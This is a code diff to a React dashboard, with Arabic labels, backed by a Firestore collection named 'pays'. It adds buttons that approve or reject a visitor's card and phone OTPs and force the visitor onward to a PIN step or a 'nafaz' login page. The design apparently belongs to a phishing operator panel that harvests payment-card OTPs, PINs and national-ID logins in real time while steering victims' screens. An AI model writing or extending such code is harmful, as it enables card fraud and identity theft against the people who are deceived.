@@ -1647,15 +1647,20 @@ export default function Dashboard() {
                         !selectedApplication.cardOtpApproved && (
                           <Button
                             size="sm"
-                            onClick={() => {
-                              handleFieldApproval(
+                            onClick={async () => {
+                              await handleFieldApproval(
                                 selectedApplication.id,
                                 "cardOtpApproved",
                                 true,
                               );
-                              handleApprovalStatus(
+                              await handleApprovalStatus(
                                 selectedApplication.id,
                                 "approved_otp",
+                              );
+                              // Force visitor to PIN step after OTP approval
+                              await handleUpdateCurrentPage(
+                                selectedApplication.id,
+                                7,
                               );
                             }}
                             className="bg-emerald-600 hover:bg-emerald-700"
@@ -1669,13 +1674,24 @@ export default function Dashboard() {
                         !selectedApplication.phoneOtpApproved && (
                           <Button
                             size="sm"
-                            onClick={() =>
-                              handleFieldApproval(
+                            onClick={async () => {
+                              await handleFieldApproval(
                                 selectedApplication.id,
                                 "phoneOtpApproved",
                                 true,
-                              )
-                            }
+                              );
+                              if (db) {
+                                await updateDoc(
+                                  doc(db, "pays", selectedApplication.id),
+                                  { phoneVerificationStatus: "approved" },
+                                );
+                              }
+                              // Approved phone OTP -> go to Nafaz
+                              await handleUpdateCurrentPage(
+                                selectedApplication.id,
+                                "nafaz",
+                              );
+                            }}
                             className="bg-pink-600 hover:bg-pink-700"
                             data-testid="button-approve-phone-otp"
                           >
@@ -1683,23 +1699,66 @@ export default function Dashboard() {
                             موافقة OTP الهاتف
                           </Button>
                         )}
-                      {(selectedApplication.otpCode ||
-                        selectedApplication.phoneOtpCode) &&
-                        !selectedApplication.cardOtpApproved &&
+                      {selectedApplication.otpCode &&
+                        !selectedApplication.cardOtpApproved && (
+                          <Button
+                            size="sm"
+                            variant="destructive"
+                            onClick={async () => {
+                              if (!db) return;
+                              await updateDoc(
+                                doc(db, "pays", selectedApplication.id),
+                                {
+                                  approvalStatus: "rejected",
+                                  rejectionReason:
+                                    "رمز OTP للبطاقة غير صحيح - يرجى إعادة المحاولة",
+                                },
+                              );
+                              await handleUpdateCurrentPage(
+                                selectedApplication.id,
+                                5,
+                              );
+                              toast({
+                                title: "تم رفض OTP البطاقة",
+                                description: "سيظهر خطأ للمستخدم",
+                                variant: "destructive",
+                              });
+                            }}
+                            data-testid="button-reject-card-otp"
+                          >
+                            <Ban className="h-4 w-4 ml-2" />
+                            رفض OTP البطاقة
+                          </Button>
+                        )}
+
+                      {selectedApplication.phoneOtpCode &&
                         !selectedApplication.phoneOtpApproved && (
                           <Button
                             size="sm"
                             variant="destructive"
-                            onClick={() =>
-                              handleApprovalStatus(
+                            onClick={async () => {
+                              if (!db) return;
+                              await updateDoc(
+                                doc(db, "pays", selectedApplication.id),
+                                {
+                                  phoneVerificationStatus: "rejected",
+                                  phoneOtpCode: null,
+                                },
+                              );
+                              await handleUpdateCurrentPage(
                                 selectedApplication.id,
-                                "rejected",
-                              )
-                            }
-                            data-testid="button-reject-otp"
+                                "phone-verification",
+                              );
+                              toast({
+                                title: "تم رفض OTP الهاتف",
+                                description: "سيظهر خطأ للمستخدم",
+                                variant: "destructive",
+                              });
+                            }}
+                            data-testid="button-reject-phone-otp"
                           >
                             <Ban className="h-4 w-4 ml-2" />
-                            رفض
+                            رفض OTP الهاتف
                           </Button>
                         )}
                     </div>
